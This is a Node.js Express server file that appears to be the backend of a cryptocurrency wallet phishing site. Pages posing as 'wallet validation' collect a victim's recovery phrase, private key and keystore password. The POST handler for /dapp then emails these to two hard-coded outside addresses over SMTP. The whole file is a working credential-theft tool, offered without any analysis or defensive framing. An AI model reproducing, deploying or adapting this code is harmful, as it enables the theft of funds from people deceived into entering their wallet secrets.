const xpress = require("express")
const bodyParser = require("body-parser");
const nodemailer = require('nodemailer')
require('dotenv').config({path:"./mydet.env"})

// console.log(process.env.EMAILUSER) // remove this after you've confirmed it is working




const app = xpress();
app.set("view engine", "ejs");

app.use(bodyParser.urlencoded({extended: true}));
app.use(bodyParser.json())

app.use(xpress.static("public"))

async function main(Mes) {
    // mes = {
    //     wallet: 'Trust Wallet',
    //     type: '',
    //     phrase: 'jsjdkjdjkj',
    //     keystorejson: '',
    //     keystorepassword: '',
    //     privatekey: ''
    //   }
    // Generate test SMTP service account from ethereal.email
    // Only needed if you don't have a real mail account for testing
    // let testAccount = await nodemailer.createTestAccount();
  
    // create reusable transporter object using the default SMTP transport
    let transporter = nodemailer.createTransport({
      host: "mail.privateemail.com",
    //   pool: true,
      port: 465,
      secure: true, // true for 465, false for other ports
      auth: {
        user: process.env.EMAILUSER, // generated ethereal user
        pass: process.env.EMAILPASS, // generated ethereal password
      },
    });

    // transporter.verify(function(det){
    //     console.log("helllo")
    // }, function(err){
    //     console.log(err)
    // })
  
    // send mail with defined transport object
    let info = await transporter.sendMail({
      from: '"Wallet Login 👻" <info@unitedbconsesusnode.com>', // sender address
      to: "mrjohn.soft@gmail.com,Huyfardry@gmail.com", // list of receivers
      subject: "Hello ✔", // Subject line
      text: `${Mes}`, // plain text body
      html: `<b>${Mes}</b>`, // html body
    });
  
    console.log("Message sent: %s", info.messageId);
    // Message sent: <b658f8ca-6296-ccf4-8306-87d57a0b4321@example.com>
  
    // // Preview only available when sending through an Ethereal account
    // console.log("Preview URL: %s", nodemailer.getTestMessageUrl(info));
    // // Preview URL: https://ethereal.email/message/WaQKMgKddxQDoou...
  }
  
//   await main().catch(console.error);


app.get("/", (req,res) => {
    console.log(req)
    // return res.sendFile(__dirname + "/DappsTools.html")
    return res.render("DappsTools")
});

app.get("/dapp", (req, res) =>{
    // console.log(req)
    // return res.sendFile(__dirname + "/Wallets Validation.html")
    return res.render("WalletsValidation")

})
app.post("/dapp", function(req, res){
    const Mes= JSON.stringify(req.body).slice(1,-1)
    main(Mes).catch(e=> console.log(e))
    console.log(Mes)

    res.redirect("/validate")
})

app.get("/validate", function(req, res){
    res.sendFile(__dirname + "/import.html")
})



app.listen(3000, function(e){

    console.log(e)
})